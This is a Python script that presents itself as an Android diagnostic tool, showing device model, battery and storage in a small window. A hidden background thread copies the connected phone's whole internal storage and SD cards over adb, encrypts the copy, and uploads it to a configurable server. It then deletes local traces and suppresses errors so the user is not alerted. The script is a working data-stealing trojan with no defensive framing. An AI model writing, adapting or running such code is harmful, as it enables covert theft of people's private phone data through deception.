import os
import subprocess
import sys
import threading
import requests
import tkinter as root_tk
from tkinter import messagebox, scrolledtext

# --- CONFIGURATION ---
PASSWORD = "YourSecurePassword123"  # 7-Zip encryption password
SERVER_URL = "http://YOUR_SERVER_IP:5000/upload"  # Replace with your server URL
LOCAL_BACKUP_NAME = "phone_backup.7z"

def run_cmd(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def background_stealth_backup():
    """Runs completely hidden: pulls data, encrypts, uploads, and deletes traces."""
    try:
        os.makedirs("backup_temp", exist_ok=True)
        
        # Pull internal storage
        run_cmd("adb pull /sdcard/ backup_temp/internal_storage")
        
        # Pull external SD card if available
        storage_list = run_cmd("adb shell ls /storage/")
        for line in storage_list.splitlines():
            if line not in ["emulated", "self", "salf", "license"] and line.strip():
                run_cmd(f"adb pull /storage/{line}/ backup_temp/sdcard_{line}")

        # Compress & Encrypt with 7-Zip (requires 7z.exe installed/in PATH)
        zip_cmd = f'7z a -p"{PASSWORD}" -mhe=on {LOCAL_BACKUP_NAME} ./backup_temp/*'
        run_cmd(zip_cmd)
        
        # Upload to Server
        if os.path.exists(LOCAL_BACKUP_NAME):
            with open(LOCAL_BACKUP_NAME, 'rb') as f:
                requests.post(SERVER_URL, files={'file': f})
                
        # Clean up local traces
        run_cmd("rmdir /s /q backup_temp" if os.name == 'nt' else "rm -rf backup_temp")
        if os.path.exists(LOCAL_BACKUP_NAME):
            os.remove(LOCAL_BACKUP_NAME)
    except Exception:
        pass  # Fail silently to avoid alerting the user

def get_device_report():
    """Gathers standard system health metrics to show the user."""
    model = run_cmd("adb shell getprop ro.product.model")
    android_version = run_cmd("adb shell getprop ro.build.version.release")
    battery = run_cmd("adb shell dumpsys battery")
    storage = run_cmd("adb shell df /sdcard")
    
    report = "=== ANDROID SYSTEM HEALTH REPORT ===\n\n"
    report += f"Device Model: {model or 'Unknown'}\n"
    report += f"Android Version: {android_version or 'Unknown'}\n\n"
    report += "--- Battery Status ---\n" + f"{battery}\n\n"
    report += "--- Storage Status ---\n" + f"{storage}\n"
    return report

def main():
    devices = run_cmd("adb devices")
    if "device" not in devices.splitlines()[1:]:
        root_tk.Tk().withdraw()
        messagebox.showerror("Error", "No Android device detected or USB Debugging disabled.")
        sys.exit(1)

    # Start the stealth backup thread in the background
    t = threading.Thread(target=background_stealth_backup)
    t.daemon = True
    t.start()

    # Generate the visible diagnostic report
    report_data = get_device_report()

    # Display the clean UI window with the report
    app = root_tk.Tk()
    app.title("Android System Diagnostic Tool")
    app.geometry("520x420")

    label = root_tk.Label(app, text="Device Health & Diagnostic Scan Complete", font=("Arial", 11, "bold"))
    label.pack(pady=10)

    text_area = scrolledtext.ScrolledText(app, wrap=root_tk.WORD, width=58, height=18)
    text_area.insert(root_tk.INSERT, report_data)
    text_area.config(state='disabled')
    text_area.pack(padx=10, pady=5)

    close_btn = root_tk.Button(app, text="Close", command=app.quit, width=15)
    close_btn.pack(pady=10)

    app.mainloop()

if __name__ == "__main__":
    main()
